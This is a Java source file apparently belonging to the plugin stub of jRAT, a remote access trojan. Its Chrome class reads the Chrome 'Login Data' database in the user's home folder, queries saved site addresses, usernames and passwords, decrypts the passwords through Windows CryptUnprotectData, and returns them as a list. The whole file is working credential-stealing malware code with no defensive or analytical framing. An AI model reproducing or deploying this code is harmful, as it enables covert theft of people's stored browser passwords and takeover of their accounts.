package jrat.plugin.recovery.stub.programs;

import java.sql.Connection;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.List;

import jrat.plugin.recovery.stub.NativeUtils;

import org.sqlite.SQLiteConfig;
import org.sqlite.SQLiteConfig.TransactionMode;

public class Chrome extends AbstractRecoverer {

	@Override
	public List<String[]> recover() throws Exception {
		List<String[]> list = new ArrayList<String[]>();

		SQLiteConfig config = new SQLiteConfig();
		config.setReadOnly(true);

		config.setTransactionMode(TransactionMode.EXCLUSIVE);
		Connection db = config.createConnection("jdbc:sqlite:" + System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
		db.setAutoCommit(true);

		ResultSet results = db.createStatement().executeQuery("SELECT action_url, username_value, password_value FROM logins");

		while (results.next()) {
			String address = results.getString("action_url");
			String username = results.getString("username_value");

			String password = new String(NativeUtils.cryptUnprotectData(results.getBytes("password_value")));

			list.add(new String[] { username, password, address });
		}

		return list;
	}

	@Override
	public String getName() {
		return "Google Chrome";
	}

}
